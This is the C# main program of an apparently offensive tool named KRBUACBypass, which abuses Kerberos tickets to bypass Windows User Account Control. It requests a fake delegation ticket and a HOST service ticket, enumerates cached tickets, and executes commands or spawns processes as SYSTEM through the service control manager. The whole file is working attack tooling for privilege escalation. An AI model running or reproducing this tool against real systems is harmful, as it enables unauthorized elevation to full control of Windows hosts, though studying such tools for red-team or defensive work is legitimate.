using System;
using System.Net;
using CommandLine;
using CommandLine.Text;
using KRBUACBypass.lib.Interop;
using System.Collections.Generic;

namespace KRBUACBypass
{
    public class Options
    {
        [Option('c', "Command", Required = false, HelpText = "Program to run.")]
        public string Command { get; set; }

        [Option('v', "Verbose", Required = false, HelpText = "Output verbose debug information.")]
        public bool Verbose { get; set; }
    }

    internal class Program
    {
        public static bool wrapTickets = true;
        public static bool Debug = false;
        public static bool Verbose = false;
        public static bool BogusMachineID = true;
        static void Main(string[] args)
        {
            var ParserResult = new CommandLine.Parser(with => with.HelpWriter = null)
                .ParseArguments<Options>(args);
            if (args.Length == 0)
            {
                return;
            }
            ParserResult
                .WithParsed(options => Run(args, options))
                .WithNotParsed(errs => DisplayHelp(ParserResult));
        }

        static void DisplayHelp<T>(ParserResult<T> result)
        {
            var helpText = HelpText.AutoBuild(result, h =>
            {
                h.AdditionalNewLineAfterOption = false;
                h.MaximumDisplayWidth = 100;
                h.Heading = "\nKRBUACBypass 1.0.0-beta"; //change header
                h.Copyright = "Copyright (c) 2023"; //change copyright text
                return HelpText.DefaultParsingErrorsHandler(result, h);
            }, e => e);
            Console.WriteLine(helpText);
        }

        private static void Run(string[] args, Options options)
        {
            string method = args[0];
            string command = options.Command;
            Verbose = options.Verbose;

            string domainController = Networking.GetDCName();
            string service = $"HOST/{Dns.GetHostName()}";
            Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;
            string outfile = "";
            bool ptt = true;

            if(method == "asktgs")
            {
                byte[] blah = LSA.RequestFakeDelegTicket();
                KRB_CRED kirbi = new KRB_CRED(blah);
                Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);
            }

            if (method == "krbscm")
            {
                // extract out the tickets (w/ full data) with the specified targeting options
                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, new LUID(), "HOST", null, null, true);
                
                if(sessionCreds[0].Tickets.Count > 0)
                {
                    // display tickets with the "Full" format
                    LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Klist);
                    try
                    {
                        KrbSCM.Execute(command);
                    }
                    catch { }
                    return;
                }
                else
                {
                    Console.WriteLine("[-] Please request a HOST service ticket for the current user first.");
                    Console.WriteLine("[-] Please execute: KRBUACBypass.exe asktgs.");
                    return;
                }
            }

            if (method == "system")
            {
                try
                {
                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                }
                catch { }
                return;
            }
        }
    }
}
